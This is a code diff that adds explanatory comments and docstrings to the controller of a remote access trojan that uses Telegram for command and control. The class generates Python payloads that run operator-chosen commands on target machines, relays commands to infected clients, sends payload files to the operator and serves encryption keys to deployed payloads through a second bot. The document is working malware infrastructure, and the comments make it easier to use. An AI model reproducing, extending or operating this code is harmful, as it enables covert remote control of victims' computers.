@@ -19,28 +19,51 @@ from core.payload_generator import PayloadGenerator
 from core.crypto import CryptoHandler
 
 class BotController:
+    """Controller for the Telegram-based RAT.
+
+    Orchestrates two bot instances:
+      - Main bot: receives operator commands and generates payloads.
+      - Payload bot: short-poll endpoint that receives /getkey_<id>
+        requests and responds with the stored key.
+    """
     def __init__(self):
+        # Primary bot used to interact with the operator
         self.bot = telepot.Bot(TOKEN)
 
+        # Helpers and subsystems
         self.client_manager = ClientManager()
         self.crypto = CryptoHandler(MASTER_SECRET, SALT)
         self.payload_gen = PayloadGenerator(MASTER_SECRET, SALT, TOKEN, PAYLOAD_BOT_TOKEN)
+
+        # Secondary bot used to serve keys to deployed payloads
         self.payload_bot = telepot.Bot(PAYLOAD_BOT_TOKEN)
         self.payload_bot_offset = None
+
+        # Runtime state
         self.running = True
+        # key_store maps key_id -> key material
         self.key_store = {}
+        # pending_keys maps key_id -> chat_id that requested the payload
         self.pending_keys = {}
 
     def handle_main_message(self, msg):
+        """Handle incoming messages sent to the main bot.
+
+        Messages may be commands (starting with '/') or client-related
+        payloads. This method delegates to `handle_command` for bot
+        commands and to `client_manager` for client messages.
+        """
         try:
             content_type, chat_type, chat_id = telepot.glance(msg)
 
             if content_type == 'text':
                 text = msg['text']
 
+                # Bot commands
                 if text.startswith('/'):
                     self.handle_command(chat_id, text)
                 else:
+                    # Client protocol messages start with '!{client_id} '
                     if text.startswith('!'):
                         parts = text.split(' ', 1)
                         if len(parts) == 2:
@@ -48,6 +71,8 @@ class BotController:
                             command = parts[1]
                             self.client_manager.handle_client_message(client_id, command, chat_id, self.bot)
                     else:
+                        # If a default client is set, treat plain text as a
+                        # command for that client; otherwise notify operator.
                         default = self.client_manager.get_default_client()
                         if default:
                             self.client_manager.execute_command(default, text, chat_id, self.bot)
@@ -61,6 +86,7 @@ class BotController:
             try:
                 self.bot.sendMessage(chat_id, f'[!] Error: {e}')
             except:
+                # Best-effort: avoid raising from an error handler
                 pass
 
     def handle_command(self, chat_id, text):
@@ -68,6 +94,7 @@ class BotController:
         cmd = parts[0]
         args = parts[1] if len(parts) > 1 else ''
 
+        # Common admin commands
         if cmd == '/start':
             self.bot.sendMessage(chat_id, self.get_help())
 
@@ -75,6 +102,7 @@ class BotController:
             self.bot.sendMessage(chat_id, self.get_help())
 
         elif cmd == '/generate_payload':
+            # Generate a Python payload that will execute `args` when run on target
             if not args:
                 self.bot.sendMessage(chat_id, 'Usage: /generate_payload <command>')
                 return
@@ -103,6 +131,7 @@ class BotController:
                 self.bot.sendMessage(chat_id, f'[!] Client not found: {args}')
 
         elif cmd == '/getkey':
+            # Expose the current key for debugging (not secure)
             key = self.crypto.get_current_key()
             self.bot.sendMessage(chat_id, f'Current Key: {key}')
 
@@ -110,6 +139,13 @@ class BotController:
             self.bot.sendMessage(chat_id, f'[!] Unknown command: {cmd}')
 
     def send_payload(self, chat_id, script, key_id, payload_type, key=None):
+        """Send generated payload as a document and notify the operator.
+
+        The payload script is written to a temporary file so it can be
+        sent using `sendDocument`. If a key_id is present we store the
+        key in `key_store` and remember the requesting chat so the
+        secondary bot can reply with the key when asked.
+        """
         try:
             if key_id:
                 if key is None:
@@ -123,12 +159,14 @@ class BotController:
             temp.write(script)
             temp.close()
 
+            # Send the generated payload as a document attachment
             with open(temp.name, 'rb') as f:
                 caption = f'📦 {payload_type}'
                 if key_id:
                     caption += f'\nKey ID: {key_id}'
                 self.bot.sendDocument(chat_id, f, caption=caption)
 
+            # Clean up the temporary file
             os.unlink(temp.name)
 
             if key_id:
@@ -148,7 +186,12 @@ class BotController:
             self.bot.sendMessage(chat_id, f'[!] Error: {e}')
 
     def process_payload_bot_requests(self):
-        """Poll the second bot for /getkey_<key_id> requests and reply with the stored key."""
+        """Short-poll the secondary bot for /getkey_<id> requests.
+
+        This method performs a single short poll of the second bot's
+        updates and replies with the key if it is available in
+        `self.key_store`.
+        """
         try:
             url = f"https://api.telegram.org/bot{PAYLOAD_BOT_TOKEN}/getUpdates?limit=1&timeout=0"
             if self.payload_bot_offset is not None:
@@ -158,6 +201,7 @@ class BotController:
             try:
                 resp = urllib.request.urlopen(req, timeout=10)
             except urllib.error.HTTPError as e:
+                # 409 indicates webhook/long-poll conflict — ignore briefly
                 if e.code == 409:
                     time.sleep(0.5)
                     return
@@ -239,9 +283,12 @@ class BotController:
         self.bot.sendMessage(chat_id, msg)
 
     def handle_document(self, msg, chat_id):
+        """Handle incoming document uploads (e.g., uploaded payloads)."""
         try:
             file_id = msg['document']['file_id']
             file_name = msg['document'].get('file_name', 'unknown.py')
+            # For now we only acknowledge receipt; future work may
+            # download and validate the script.
             self.bot.sendMessage(chat_id, f'📁 Received: {file_name}')
         except Exception as e:
             self.bot.sendMessage(chat_id, f'[!] Error: {e}')
